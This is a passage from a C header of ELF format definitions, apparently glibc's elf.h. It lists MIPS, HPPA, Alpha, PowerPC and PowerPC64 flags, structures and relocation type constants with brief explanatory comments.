#define RHF_NOTPOT		   (1 << 1)	/* Hash size not power of 2 */
#define RHF_NO_LIBRARY_REPLACEMENT (1 << 2)	/* Ignore LD_LIBRARY_PATH */
#define RHF_NO_MOVE		   (1 << 3)
#define RHF_SGI_ONLY		   (1 << 4)
#define RHF_GUARANTEE_INIT	   (1 << 5)
#define RHF_DELTA_C_PLUS_PLUS	   (1 << 6)
#define RHF_GUARANTEE_START_INIT   (1 << 7)
#define RHF_PIXIE		   (1 << 8)
#define RHF_DEFAULT_DELAY_LOAD	   (1 << 9)
#define RHF_REQUICKSTART	   (1 << 10)
#define RHF_REQUICKSTARTED	   (1 << 11)
#define RHF_CORD		   (1 << 12)
#define RHF_NO_UNRES_UNDEF	   (1 << 13)
#define RHF_RLD_ORDER_SAFE	   (1 << 14)

/* Entries found in sections of type SHT_MIPS_LIBLIST.  */

typedef struct
{
  Elf32_Word l_name;		/* Name (string table index) */
  Elf32_Word l_time_stamp;	/* Timestamp */
  Elf32_Word l_checksum;	/* Checksum */
  Elf32_Word l_version;		/* Interface version */
  Elf32_Word l_flags;		/* Flags */
} Elf32_Lib;

typedef struct
{
  Elf64_Word l_name;		/* Name (string table index) */
  Elf64_Word l_time_stamp;	/* Timestamp */
  Elf64_Word l_checksum;	/* Checksum */
  Elf64_Word l_version;		/* Interface version */
  Elf64_Word l_flags;		/* Flags */
} Elf64_Lib;


/* Legal values for l_flags.  */

#define LL_NONE		  0
#define LL_EXACT_MATCH	  (1 << 0)	/* Require exact match */
#define LL_IGNORE_INT_VER (1 << 1)	/* Ignore interface version */
#define LL_REQUIRE_MINOR  (1 << 2)
#define LL_EXPORTS	  (1 << 3)
#define LL_DELAY_LOAD	  (1 << 4)
#define LL_DELTA	  (1 << 5)

/* Entries found in sections of type SHT_MIPS_CONFLICT.  */

typedef Elf32_Addr Elf32_Conflict;

typedef struct
{
  /* Version of flags structure.  */
  Elf32_Half version;
  /* The level of the ISA: 1-5, 32, 64.  */
  unsigned char isa_level;
  /* The revision of ISA: 0 for MIPS V and below, 1-n otherwise.  */
  unsigned char isa_rev;
  /* The size of general purpose registers.  */
  unsigned char gpr_size;
  /* The size of co-processor 1 registers.  */
  unsigned char cpr1_size;
  /* The size of co-processor 2 registers.  */
  unsigned char cpr2_size;
  /* The floating-point ABI.  */
  unsigned char fp_abi;
  /* Processor-specific extension.  */
  Elf32_Word isa_ext;
  /* Mask of ASEs used.  */
  Elf32_Word ases;
  /* Mask of general flags.  */
  Elf32_Word flags1;
  Elf32_Word flags2;
} Elf_MIPS_ABIFlags_v0;

/* Values for the register size bytes of an abi flags structure.  */

#define MIPS_AFL_REG_NONE	0x00	 /* No registers.  */
#define MIPS_AFL_REG_32		0x01	 /* 32-bit registers.  */
#define MIPS_AFL_REG_64		0x02	 /* 64-bit registers.  */
#define MIPS_AFL_REG_128	0x03	 /* 128-bit registers.  */

/* Masks for the ases word of an ABI flags structure.  */

#define MIPS_AFL_ASE_DSP	0x00000001 /* DSP ASE.  */
#define MIPS_AFL_ASE_DSPR2	0x00000002 /* DSP R2 ASE.  */
#define MIPS_AFL_ASE_EVA	0x00000004 /* Enhanced VA Scheme.  */
#define MIPS_AFL_ASE_MCU	0x00000008 /* MCU (MicroController) ASE.  */
#define MIPS_AFL_ASE_MDMX	0x00000010 /* MDMX ASE.  */
#define MIPS_AFL_ASE_MIPS3D	0x00000020 /* MIPS-3D ASE.  */
#define MIPS_AFL_ASE_MT		0x00000040 /* MT ASE.  */
#define MIPS_AFL_ASE_SMARTMIPS	0x00000080 /* SmartMIPS ASE.  */
#define MIPS_AFL_ASE_VIRT	0x00000100 /* VZ ASE.  */
#define MIPS_AFL_ASE_MSA	0x00000200 /* MSA ASE.  */
#define MIPS_AFL_ASE_MIPS16	0x00000400 /* MIPS16 ASE.  */
#define MIPS_AFL_ASE_MICROMIPS	0x00000800 /* MICROMIPS ASE.  */
#define MIPS_AFL_ASE_XPA	0x00001000 /* XPA ASE.  */
#define MIPS_AFL_ASE_MASK	0x00001fff /* All ASEs.  */

/* Values for the isa_ext word of an ABI flags structure.  */

#define MIPS_AFL_EXT_XLR	  1   /* RMI Xlr instruction.  */
#define MIPS_AFL_EXT_OCTEON2	  2   /* Cavium Networks Octeon2.  */
#define MIPS_AFL_EXT_OCTEONP	  3   /* Cavium Networks OcteonP.  */
#define MIPS_AFL_EXT_LOONGSON_3A  4   /* Loongson 3A.  */
#define MIPS_AFL_EXT_OCTEON	  5   /* Cavium Networks Octeon.  */
#define MIPS_AFL_EXT_5900	  6   /* MIPS R5900 instruction.  */
#define MIPS_AFL_EXT_4650	  7   /* MIPS R4650 instruction.  */
#define MIPS_AFL_EXT_4010	  8   /* LSI R4010 instruction.  */
#define MIPS_AFL_EXT_4100	  9   /* NEC VR4100 instruction.  */
#define MIPS_AFL_EXT_3900	  10  /* Toshiba R3900 instruction.  */
#define MIPS_AFL_EXT_10000	  11  /* MIPS R10000 instruction.  */
#define MIPS_AFL_EXT_SB1	  12  /* Broadcom SB-1 instruction.  */
#define MIPS_AFL_EXT_4111	  13  /* NEC VR4111/VR4181 instruction.  */
#define MIPS_AFL_EXT_4120	  14  /* NEC VR4120 instruction.  */
#define MIPS_AFL_EXT_5400	  15  /* NEC VR5400 instruction.  */
#define MIPS_AFL_EXT_5500	  16  /* NEC VR5500 instruction.  */
#define MIPS_AFL_EXT_LOONGSON_2E  17  /* ST Microelectronics Loongson 2E.  */
#define MIPS_AFL_EXT_LOONGSON_2F  18  /* ST Microelectronics Loongson 2F.  */

/* Masks for the flags1 word of an ABI flags structure.  */
#define MIPS_AFL_FLAGS1_ODDSPREG  1  /* Uses odd single-precision registers.  */

/* Object attribute values.  */
enum
{
  /* Not tagged or not using any ABIs affected by the differences.  */
  Val_GNU_MIPS_ABI_FP_ANY = 0,
  /* Using hard-float -mdouble-float.  */
  Val_GNU_MIPS_ABI_FP_DOUBLE = 1,
  /* Using hard-float -msingle-float.  */
  Val_GNU_MIPS_ABI_FP_SINGLE = 2,
  /* Using soft-float.  */
  Val_GNU_MIPS_ABI_FP_SOFT = 3,
  /* Using -mips32r2 -mfp64.  */
  Val_GNU_MIPS_ABI_FP_OLD_64 = 4,
  /* Using -mfpxx.  */
  Val_GNU_MIPS_ABI_FP_XX = 5,
  /* Using -mips32r2 -mfp64.  */
  Val_GNU_MIPS_ABI_FP_64 = 6,
  /* Using -mips32r2 -mfp64 -mno-odd-spreg.  */
  Val_GNU_MIPS_ABI_FP_64A = 7,
  /* Maximum allocated FP ABI value.  */
  Val_GNU_MIPS_ABI_FP_MAX = 7
};

/* HPPA specific definitions.  */

/* Legal values for e_flags field of Elf32_Ehdr.  */

#define EF_PARISC_TRAPNIL	0x00010000 /* Trap nil pointer dereference.  */
#define EF_PARISC_EXT		0x00020000 /* Program uses arch. extensions. */
#define EF_PARISC_LSB		0x00040000 /* Program expects little endian. */
#define EF_PARISC_WIDE		0x00080000 /* Program expects wide mode.  */
#define EF_PARISC_NO_KABP	0x00100000 /* No kernel assisted branch
					      prediction.  */
#define EF_PARISC_LAZYSWAP	0x00400000 /* Allow lazy swapping.  */
#define EF_PARISC_ARCH		0x0000ffff /* Architecture version.  */

/* Defined values for `e_flags & EF_PARISC_ARCH\' are:  */

#define EFA_PARISC_1_0		    0x020b /* PA-RISC 1.0 big-endian.  */
#define EFA_PARISC_1_1		    0x0210 /* PA-RISC 1.1 big-endian.  */
#define EFA_PARISC_2_0		    0x0214 /* PA-RISC 2.0 big-endian.  */

/* Additional section indices.  */

#define SHN_PARISC_ANSI_COMMON	0xff00	   /* Section for tentatively declared
					      symbols in ANSI C.  */
#define SHN_PARISC_HUGE_COMMON	0xff01	   /* Common blocks in huge model.  */

/* Legal values for sh_type field of Elf32_Shdr.  */

#define SHT_PARISC_EXT		0x70000000 /* Contains product specific ext. */
#define SHT_PARISC_UNWIND	0x70000001 /* Unwind information.  */
#define SHT_PARISC_DOC		0x70000002 /* Debug info for optimized code. */

/* Legal values for sh_flags field of Elf32_Shdr.  */

#define SHF_PARISC_SHORT	0x20000000 /* Section with short addressing. */
#define SHF_PARISC_HUGE		0x40000000 /* Section far from gp.  */
#define SHF_PARISC_SBP		0x80000000 /* Static branch prediction code. */

/* Legal values for ST_TYPE subfield of st_info (symbol type).  */

#define STT_PARISC_MILLICODE	13	/* Millicode function entry point.  */

#define STT_HP_OPAQUE		(STT_LOOS + 0x1)
#define STT_HP_STUB		(STT_LOOS + 0x2)

/* HPPA relocs.  */

#define R_PARISC_NONE		0	/* No reloc.  */
#define R_PARISC_DIR32		1	/* Direct 32-bit reference.  */
#define R_PARISC_DIR21L		2	/* Left 21 bits of eff. address.  */
#define R_PARISC_DIR17R		3	/* Right 17 bits of eff. address.  */
#define R_PARISC_DIR17F		4	/* 17 bits of eff. address.  */
#define R_PARISC_DIR14R		6	/* Right 14 bits of eff. address.  */
#define R_PARISC_PCREL32	9	/* 32-bit rel. address.  */
#define R_PARISC_PCREL21L	10	/* Left 21 bits of rel. address.  */
#define R_PARISC_PCREL17R	11	/* Right 17 bits of rel. address.  */
#define R_PARISC_PCREL17F	12	/* 17 bits of rel. address.  */
#define R_PARISC_PCREL14R	14	/* Right 14 bits of rel. address.  */
#define R_PARISC_DPREL21L	18	/* Left 21 bits of rel. address.  */
#define R_PARISC_DPREL14R	22	/* Right 14 bits of rel. address.  */
#define R_PARISC_GPREL21L	26	/* GP-relative, left 21 bits.  */
#define R_PARISC_GPREL14R	30	/* GP-relative, right 14 bits.  */
#define R_PARISC_LTOFF21L	34	/* LT-relative, left 21 bits.  */
#define R_PARISC_LTOFF14R	38	/* LT-relative, right 14 bits.  */
#define R_PARISC_SECREL32	41	/* 32 bits section rel. address.  */
#define R_PARISC_SEGBASE	48	/* No relocation, set segment base.  */
#define R_PARISC_SEGREL32	49	/* 32 bits segment rel. address.  */
#define R_PARISC_PLTOFF21L	50	/* PLT rel. address, left 21 bits.  */
#define R_PARISC_PLTOFF14R	54	/* PLT rel. address, right 14 bits.  */
#define R_PARISC_LTOFF_FPTR32	57	/* 32 bits LT-rel. function pointer. */
#define R_PARISC_LTOFF_FPTR21L	58	/* LT-rel. fct ptr, left 21 bits. */
#define R_PARISC_LTOFF_FPTR14R	62	/* LT-rel. fct ptr, right 14 bits. */
#define R_PARISC_FPTR64		64	/* 64 bits function address.  */
#define R_PARISC_PLABEL32	65	/* 32 bits function address.  */
#define R_PARISC_PLABEL21L	66	/* Left 21 bits of fdesc address.  */
#define R_PARISC_PLABEL14R	70	/* Right 14 bits of fdesc address.  */
#define R_PARISC_PCREL64	72	/* 64 bits PC-rel. address.  */
#define R_PARISC_PCREL22F	74	/* 22 bits PC-rel. address.  */
#define R_PARISC_PCREL14WR	75	/* PC-rel. address, right 14 bits.  */
#define R_PARISC_PCREL14DR	76	/* PC rel. address, right 14 bits.  */
#define R_PARISC_PCREL16F	77	/* 16 bits PC-rel. address.  */
#define R_PARISC_PCREL16WF	78	/* 16 bits PC-rel. address.  */
#define R_PARISC_PCREL16DF	79	/* 16 bits PC-rel. address.  */
#define R_PARISC_DIR64		80	/* 64 bits of eff. address.  */
#define R_PARISC_DIR14WR	83	/* 14 bits of eff. address.  */
#define R_PARISC_DIR14DR	84	/* 14 bits of eff. address.  */
#define R_PARISC_DIR16F		85	/* 16 bits of eff. address.  */
#define R_PARISC_DIR16WF	86	/* 16 bits of eff. address.  */
#define R_PARISC_DIR16DF	87	/* 16 bits of eff. address.  */
#define R_PARISC_GPREL64	88	/* 64 bits of GP-rel. address.  */
#define R_PARISC_GPREL14WR	91	/* GP-rel. address, right 14 bits.  */
#define R_PARISC_GPREL14DR	92	/* GP-rel. address, right 14 bits.  */
#define R_PARISC_GPREL16F	93	/* 16 bits GP-rel. address.  */
#define R_PARISC_GPREL16WF	94	/* 16 bits GP-rel. address.  */
#define R_PARISC_GPREL16DF	95	/* 16 bits GP-rel. address.  */
#define R_PARISC_LTOFF64	96	/* 64 bits LT-rel. address.  */
#define R_PARISC_LTOFF14WR	99	/* LT-rel. address, right 14 bits.  */
#define R_PARISC_LTOFF14DR	100	/* LT-rel. address, right 14 bits.  */
#define R_PARISC_LTOFF16F	101	/* 16 bits LT-rel. address.  */
#define R_PARISC_LTOFF16WF	102	/* 16 bits LT-rel. address.  */
#define R_PARISC_LTOFF16DF	103	/* 16 bits LT-rel. address.  */
#define R_PARISC_SECREL64	104	/* 64 bits section rel. address.  */
#define R_PARISC_SEGREL64	112	/* 64 bits segment rel. address.  */
#define R_PARISC_PLTOFF14WR	115	/* PLT-rel. address, right 14 bits.  */
#define R_PARISC_PLTOFF14DR	116	/* PLT-rel. address, right 14 bits.  */
#define R_PARISC_PLTOFF16F	117	/* 16 bits LT-rel. address.  */
#define R_PARISC_PLTOFF16WF	118	/* 16 bits PLT-rel. address.  */
#define R_PARISC_PLTOFF16DF	119	/* 16 bits PLT-rel. address.  */
#define R_PARISC_LTOFF_FPTR64	120	/* 64 bits LT-rel. function ptr.  */
#define R_PARISC_LTOFF_FPTR14WR	123	/* LT-rel. fct. ptr., right 14 bits. */
#define R_PARISC_LTOFF_FPTR14DR	124	/* LT-rel. fct. ptr., right 14 bits. */
#define R_PARISC_LTOFF_FPTR16F	125	/* 16 bits LT-rel. function ptr.  */
#define R_PARISC_LTOFF_FPTR16WF	126	/* 16 bits LT-rel. function ptr.  */
#define R_PARISC_LTOFF_FPTR16DF	127	/* 16 bits LT-rel. function ptr.  */
#define R_PARISC_LORESERVE	128
#define R_PARISC_COPY		128	/* Copy relocation.  */
#define R_PARISC_IPLT		129	/* Dynamic reloc, imported PLT */
#define R_PARISC_EPLT		130	/* Dynamic reloc, exported PLT */
#define R_PARISC_TPREL32	153	/* 32 bits TP-rel. address.  */
#define R_PARISC_TPREL21L	154	/* TP-rel. address, left 21 bits.  */
#define R_PARISC_TPREL14R	158	/* TP-rel. address, right 14 bits.  */
#define R_PARISC_LTOFF_TP21L	162	/* LT-TP-rel. address, left 21 bits. */
#define R_PARISC_LTOFF_TP14R	166	/* LT-TP-rel. address, right 14 bits.*/
#define R_PARISC_LTOFF_TP14F	167	/* 14 bits LT-TP-rel. address.  */
#define R_PARISC_TPREL64	216	/* 64 bits TP-rel. address.  */
#define R_PARISC_TPREL14WR	219	/* TP-rel. address, right 14 bits.  */
#define R_PARISC_TPREL14DR	220	/* TP-rel. address, right 14 bits.  */
#define R_PARISC_TPREL16F	221	/* 16 bits TP-rel. address.  */
#define R_PARISC_TPREL16WF	222	/* 16 bits TP-rel. address.  */
#define R_PARISC_TPREL16DF	223	/* 16 bits TP-rel. address.  */
#define R_PARISC_LTOFF_TP64	224	/* 64 bits LT-TP-rel. address.  */
#define R_PARISC_LTOFF_TP14WR	227	/* LT-TP-rel. address, right 14 bits.*/
#define R_PARISC_LTOFF_TP14DR	228	/* LT-TP-rel. address, right 14 bits.*/
#define R_PARISC_LTOFF_TP16F	229	/* 16 bits LT-TP-rel. address.  */
#define R_PARISC_LTOFF_TP16WF	230	/* 16 bits LT-TP-rel. address.  */
#define R_PARISC_LTOFF_TP16DF	231	/* 16 bits LT-TP-rel. address.  */
#define R_PARISC_GNU_VTENTRY	232
#define R_PARISC_GNU_VTINHERIT	233
#define R_PARISC_TLS_GD21L	234	/* GD 21-bit left.  */
#define R_PARISC_TLS_GD14R	235	/* GD 14-bit right.  */
#define R_PARISC_TLS_GDCALL	236	/* GD call to __t_g_a.  */
#define R_PARISC_TLS_LDM21L	237	/* LD module 21-bit left.  */
#define R_PARISC_TLS_LDM14R	238	/* LD module 14-bit right.  */
#define R_PARISC_TLS_LDMCALL	239	/* LD module call to __t_g_a.  */
#define R_PARISC_TLS_LDO21L	240	/* LD offset 21-bit left.  */
#define R_PARISC_TLS_LDO14R	241	/* LD offset 14-bit right.  */
#define R_PARISC_TLS_DTPMOD32	242	/* DTP module 32-bit.  */
#define R_PARISC_TLS_DTPMOD64	243	/* DTP module 64-bit.  */
#define R_PARISC_TLS_DTPOFF32	244	/* DTP offset 32-bit.  */
#define R_PARISC_TLS_DTPOFF64	245	/* DTP offset 32-bit.  */
#define R_PARISC_TLS_LE21L	R_PARISC_TPREL21L
#define R_PARISC_TLS_LE14R	R_PARISC_TPREL14R
#define R_PARISC_TLS_IE21L	R_PARISC_LTOFF_TP21L
#define R_PARISC_TLS_IE14R	R_PARISC_LTOFF_TP14R
#define R_PARISC_TLS_TPREL32	R_PARISC_TPREL32
#define R_PARISC_TLS_TPREL64	R_PARISC_TPREL64
#define R_PARISC_HIRESERVE	255

/* Legal values for p_type field of Elf32_Phdr/Elf64_Phdr.  */

#define PT_HP_TLS		(PT_LOOS + 0x0)
#define PT_HP_CORE_NONE		(PT_LOOS + 0x1)
#define PT_HP_CORE_VERSION	(PT_LOOS + 0x2)
#define PT_HP_CORE_KERNEL	(PT_LOOS + 0x3)
#define PT_HP_CORE_COMM		(PT_LOOS + 0x4)
#define PT_HP_CORE_PROC		(PT_LOOS + 0x5)
#define PT_HP_CORE_LOADABLE	(PT_LOOS + 0x6)
#define PT_HP_CORE_STACK	(PT_LOOS + 0x7)
#define PT_HP_CORE_SHM		(PT_LOOS + 0x8)
#define PT_HP_CORE_MMF		(PT_LOOS + 0x9)
#define PT_HP_PARALLEL		(PT_LOOS + 0x10)
#define PT_HP_FASTBIND		(PT_LOOS + 0x11)
#define PT_HP_OPT_ANNOT		(PT_LOOS + 0x12)
#define PT_HP_HSL_ANNOT		(PT_LOOS + 0x13)
#define PT_HP_STACK		(PT_LOOS + 0x14)

#define PT_PARISC_ARCHEXT	0x70000000
#define PT_PARISC_UNWIND	0x70000001

/* Legal values for p_flags field of Elf32_Phdr/Elf64_Phdr.  */

#define PF_PARISC_SBP		0x08000000

#define PF_HP_PAGE_SIZE		0x00100000
#define PF_HP_FAR_SHARED	0x00200000
#define PF_HP_NEAR_SHARED	0x00400000
#define PF_HP_CODE		0x01000000
#define PF_HP_MODIFY		0x02000000
#define PF_HP_LAZYSWAP		0x04000000
#define PF_HP_SBP		0x08000000


/* Alpha specific definitions.  */

/* Legal values for e_flags field of Elf64_Ehdr.  */

#define EF_ALPHA_32BIT		1	/* All addresses must be < 2GB.  */
#define EF_ALPHA_CANRELAX	2	/* Relocations for relaxing exist.  */

/* Legal values for sh_type field of Elf64_Shdr.  */

/* These two are primerily concerned with ECOFF debugging info.  */
#define SHT_ALPHA_DEBUG		0x70000001
#define SHT_ALPHA_REGINFO	0x70000002

/* Legal values for sh_flags field of Elf64_Shdr.  */

#define SHF_ALPHA_GPREL		0x10000000

/* Legal values for st_other field of Elf64_Sym.  */
#define STO_ALPHA_NOPV		0x80	/* No PV required.  */
#define STO_ALPHA_STD_GPLOAD	0x88	/* PV only used for initial ldgp.  */

/* Alpha relocs.  */

#define R_ALPHA_NONE		0	/* No reloc */
#define R_ALPHA_REFLONG		1	/* Direct 32 bit */
#define R_ALPHA_REFQUAD		2	/* Direct 64 bit */
#define R_ALPHA_GPREL32		3	/* GP relative 32 bit */
#define R_ALPHA_LITERAL		4	/* GP relative 16 bit w/optimization */
#define R_ALPHA_LITUSE		5	/* Optimization hint for LITERAL */
#define R_ALPHA_GPDISP		6	/* Add displacement to GP */
#define R_ALPHA_BRADDR		7	/* PC+4 relative 23 bit shifted */
#define R_ALPHA_HINT		8	/* PC+4 relative 16 bit shifted */
#define R_ALPHA_SREL16		9	/* PC relative 16 bit */
#define R_ALPHA_SREL32		10	/* PC relative 32 bit */
#define R_ALPHA_SREL64		11	/* PC relative 64 bit */
#define R_ALPHA_GPRELHIGH	17	/* GP relative 32 bit, high 16 bits */
#define R_ALPHA_GPRELLOW	18	/* GP relative 32 bit, low 16 bits */
#define R_ALPHA_GPREL16		19	/* GP relative 16 bit */
#define R_ALPHA_COPY		24	/* Copy symbol at runtime */
#define R_ALPHA_GLOB_DAT	25	/* Create GOT entry */
#define R_ALPHA_JMP_SLOT	26	/* Create PLT entry */
#define R_ALPHA_RELATIVE	27	/* Adjust by program base */
#define R_ALPHA_TLS_GD_HI	28
#define R_ALPHA_TLSGD		29
#define R_ALPHA_TLS_LDM		30
#define R_ALPHA_DTPMOD64	31
#define R_ALPHA_GOTDTPREL	32
#define R_ALPHA_DTPREL64	33
#define R_ALPHA_DTPRELHI	34
#define R_ALPHA_DTPRELLO	35
#define R_ALPHA_DTPREL16	36
#define R_ALPHA_GOTTPREL	37
#define R_ALPHA_TPREL64		38
#define R_ALPHA_TPRELHI		39
#define R_ALPHA_TPRELLO		40
#define R_ALPHA_TPREL16		41
/* Keep this the last entry.  */
#define R_ALPHA_NUM		46

/* Magic values of the LITUSE relocation addend.  */
#define LITUSE_ALPHA_ADDR	0
#define LITUSE_ALPHA_BASE	1
#define LITUSE_ALPHA_BYTOFF	2
#define LITUSE_ALPHA_JSR	3
#define LITUSE_ALPHA_TLS_GD	4
#define LITUSE_ALPHA_TLS_LDM	5

/* Legal values for d_tag of Elf64_Dyn.  */
#define DT_ALPHA_PLTRO		(DT_LOPROC + 0)
#define DT_ALPHA_NUM		1

/* PowerPC specific declarations */

/* Values for Elf32/64_Ehdr.e_flags.  */
#define EF_PPC_EMB		0x80000000	/* PowerPC embedded flag */

/* Cygnus local bits below */
#define EF_PPC_RELOCATABLE	0x00010000	/* PowerPC -mrelocatable flag*/
#define EF_PPC_RELOCATABLE_LIB	0x00008000	/* PowerPC -mrelocatable-lib
						   flag */

/* PowerPC relocations defined by the ABIs */
#define R_PPC_NONE		0
#define R_PPC_ADDR32		1	/* 32bit absolute address */
#define R_PPC_ADDR24		2	/* 26bit address, 2 bits ignored.  */
#define R_PPC_ADDR16		3	/* 16bit absolute address */
#define R_PPC_ADDR16_LO		4	/* lower 16bit of absolute address */
#define R_PPC_ADDR16_HI		5	/* high 16bit of absolute address */
#define R_PPC_ADDR16_HA		6	/* adjusted high 16bit */
#define R_PPC_ADDR14		7	/* 16bit address, 2 bits ignored */
#define R_PPC_ADDR14_BRTAKEN	8
#define R_PPC_ADDR14_BRNTAKEN	9
#define R_PPC_REL24		10	/* PC relative 26 bit */
#define R_PPC_REL14		11	/* PC relative 16 bit */
#define R_PPC_REL14_BRTAKEN	12
#define R_PPC_REL14_BRNTAKEN	13
#define R_PPC_GOT16		14
#define R_PPC_GOT16_LO		15
#define R_PPC_GOT16_HI		16
#define R_PPC_GOT16_HA		17
#define R_PPC_PLTREL24		18
#define R_PPC_COPY		19
#define R_PPC_GLOB_DAT		20
#define R_PPC_JMP_SLOT		21
#define R_PPC_RELATIVE		22
#define R_PPC_LOCAL24PC		23
#define R_PPC_UADDR32		24
#define R_PPC_UADDR16		25
#define R_PPC_REL32		26
#define R_PPC_PLT32		27
#define R_PPC_PLTREL32		28
#define R_PPC_PLT16_LO		29
#define R_PPC_PLT16_HI		30
#define R_PPC_PLT16_HA		31
#define R_PPC_SDAREL16		32
#define R_PPC_SECTOFF		33
#define R_PPC_SECTOFF_LO	34
#define R_PPC_SECTOFF_HI	35
#define R_PPC_SECTOFF_HA	36

/* PowerPC relocations defined for the TLS access ABI.  */
#define R_PPC_TLS		67 /* none	(sym+add)@tls */
#define R_PPC_DTPMOD32		68 /* word32	(sym+add)@dtpmod */
#define R_PPC_TPREL16		69 /* half16*	(sym+add)@tprel */
#define R_PPC_TPREL16_LO	70 /* half16	(sym+add)@tprel@l */
#define R_PPC_TPREL16_HI	71 /* half16	(sym+add)@tprel@h */
#define R_PPC_TPREL16_HA	72 /* half16	(sym+add)@tprel@ha */
#define R_PPC_TPREL32		73 /* word32	(sym+add)@tprel */
#define R_PPC_DTPREL16		74 /* half16*	(sym+add)@dtprel */
#define R_PPC_DTPREL16_LO	75 /* half16	(sym+add)@dtprel@l */
#define R_PPC_DTPREL16_HI	76 /* half16	(sym+add)@dtprel@h */
#define R_PPC_DTPREL16_HA	77 /* half16	(sym+add)@dtprel@ha */
#define R_PPC_DTPREL32		78 /* word32	(sym+add)@dtprel */
#define R_PPC_GOT_TLSGD16	79 /* half16*	(sym+add)@got@tlsgd */
#define R_PPC_GOT_TLSGD16_LO	80 /* half16	(sym+add)@got@tlsgd@l */
#define R_PPC_GOT_TLSGD16_HI	81 /* half16	(sym+add)@got@tlsgd@h */
#define R_PPC_GOT_TLSGD16_HA	82 /* half16	(sym+add)@got@tlsgd@ha */
#define R_PPC_GOT_TLSLD16	83 /* half16*	(sym+add)@got@tlsld */
#define R_PPC_GOT_TLSLD16_LO	84 /* half16	(sym+add)@got@tlsld@l */
#define R_PPC_GOT_TLSLD16_HI	85 /* half16	(sym+add)@got@tlsld@h */
#define R_PPC_GOT_TLSLD16_HA	86 /* half16	(sym+add)@got@tlsld@ha */
#define R_PPC_GOT_TPREL16	87 /* half16*	(sym+add)@got@tprel */
#define R_PPC_GOT_TPREL16_LO	88 /* half16	(sym+add)@got@tprel@l */
#define R_PPC_GOT_TPREL16_HI	89 /* half16	(sym+add)@got@tprel@h */
#define R_PPC_GOT_TPREL16_HA	90 /* half16	(sym+add)@got@tprel@ha */
#define R_PPC_GOT_DTPREL16	91 /* half16*	(sym+add)@got@dtprel */
#define R_PPC_GOT_DTPREL16_LO	92 /* half16*	(sym+add)@got@dtprel@l */
#define R_PPC_GOT_DTPREL16_HI	93 /* half16*	(sym+add)@got@dtprel@h */
#define R_PPC_GOT_DTPREL16_HA	94 /* half16*	(sym+add)@got@dtprel@ha */
#define R_PPC_TLSGD		95 /* none	(sym+add)@tlsgd */
#define R_PPC_TLSLD		96 /* none	(sym+add)@tlsld */

/* The remaining relocs are from the Embedded ELF ABI, and are not
   in the SVR4 ELF ABI.  */
#define R_PPC_EMB_NADDR32	101
#define R_PPC_EMB_NADDR16	102
#define R_PPC_EMB_NADDR16_LO	103
#define R_PPC_EMB_NADDR16_HI	104
#define R_PPC_EMB_NADDR16_HA	105
#define R_PPC_EMB_SDAI16	106
#define R_PPC_EMB_SDA2I16	107
#define R_PPC_EMB_SDA2REL	108
#define R_PPC_EMB_SDA21		109	/* 16 bit offset in SDA */
#define R_PPC_EMB_MRKREF	110
#define R_PPC_EMB_RELSEC16	111
#define R_PPC_EMB_RELST_LO	112
#define R_PPC_EMB_RELST_HI	113
#define R_PPC_EMB_RELST_HA	114
#define R_PPC_EMB_BIT_FLD	115
#define R_PPC_EMB_RELSDA	116	/* 16 bit relative offset in SDA */

/* Diab tool relocations.  */
#define R_PPC_DIAB_SDA21_LO	180	/* like EMB_SDA21, but lower 16 bit */
#define R_PPC_DIAB_SDA21_HI	181	/* like EMB_SDA21, but high 16 bit */
#define R_PPC_DIAB_SDA21_HA	182	/* like EMB_SDA21, adjusted high 16 */
#define R_PPC_DIAB_RELSDA_LO	183	/* like EMB_RELSDA, but lower 16 bit */
#define R_PPC_DIAB_RELSDA_HI	184	/* like EMB_RELSDA, but high 16 bit */
#define R_PPC_DIAB_RELSDA_HA	185	/* like EMB_RELSDA, adjusted high 16 */

/* GNU extension to support local ifunc.  */
#define R_PPC_IRELATIVE		248

/* GNU relocs used in PIC code sequences.  */
#define R_PPC_REL16		249	/* half16   (sym+add-.) */
#define R_PPC_REL16_LO		250	/* half16   (sym+add-.)@l */
#define R_PPC_REL16_HI		251	/* half16   (sym+add-.)@h */
#define R_PPC_REL16_HA		252	/* half16   (sym+add-.)@ha */

/* This is a phony reloc to handle any old fashioned TOC16 references
   that may still be in object files.  */
#define R_PPC_TOC16		255

/* PowerPC specific values for the Dyn d_tag field.  */
#define DT_PPC_GOT		(DT_LOPROC + 0)
#define DT_PPC_OPT		(DT_LOPROC + 1)
#define DT_PPC_NUM		2

/* PowerPC specific values for the DT_PPC_OPT Dyn entry.  */
#define PPC_OPT_TLS		1

/* PowerPC64 relocations defined by the ABIs */
#define R_PPC64_NONE		R_PPC_NONE
#define R_PPC64_ADDR32		R_PPC_ADDR32 /* 32bit absolute address */
#define R_PPC64_ADDR24		R_PPC_ADDR24 /* 26bit address, word aligned */
#define R_PPC64_ADDR16		R_PPC_ADDR16 /* 16bit absolute address */
#define R_PPC64_ADDR16_LO	R_PPC_ADDR16_LO	/* lower 16bits of address */
#define R_PPC64_ADDR16_HI	R_PPC_ADDR16_HI	/* high 16bits of address. */
#define R_PPC64_ADDR16_HA	R_PPC_ADDR16_HA /* adjusted high 16bits.  */
#define R_PPC64_ADDR14		R_PPC_ADDR14 /* 16bit address, word aligned */
#define R_PPC64_ADDR14_BRTAKEN	R_PPC_ADDR14_BRTAKEN
#define R_PPC64_ADDR14_BRNTAKEN	R_PPC_ADDR14_BRNTAKEN
#define R_PPC64_REL24		R_PPC_REL24 /* PC-rel. 26 bit, word aligned */
#define R_PPC64_REL14		R_PPC_REL14 /* PC relative 16 bit */
#define R_PPC64_REL14_BRTAKEN	R_PPC_REL14_BRTAKEN
#define R_PPC64_REL14_BRNTAKEN	R_PPC_REL14_BRNTAKEN
#define R_PPC64_GOT16		R_PPC_GOT16
#define R_PPC64_GOT16_LO	R_PPC_GOT16_LO
#define R_PPC64_GOT16_HI	R_PPC_GOT16_HI
#define R_PPC64_GOT16_HA	R_PPC_GOT16_HA

#define R_PPC64_COPY		R_PPC_COPY
#define R_PPC64_GLOB_DAT	R_PPC_GLOB_DAT
#define R_PPC64_JMP_SLOT	R_PPC_JMP_SLOT
#define R_PPC64_RELATIVE	R_PPC_RELATIVE

#define R_PPC64_UADDR32		R_PPC_UADDR32
#define R_PPC64_UADDR16		R_PPC_UADDR16
#define R_PPC64_REL32		R_PPC_REL32
#define R_PPC64_PLT32		R_PPC_PLT32
#define R_PPC64_PLTREL32	R_PPC_PLTREL32
#define R_PPC64_PLT16_LO	R_PPC_PLT16_LO
#define R_PPC64_PLT16_HI	R_PPC_PLT16_HI
#define R_PPC64_PLT16_HA	R_PPC_PLT16_HA

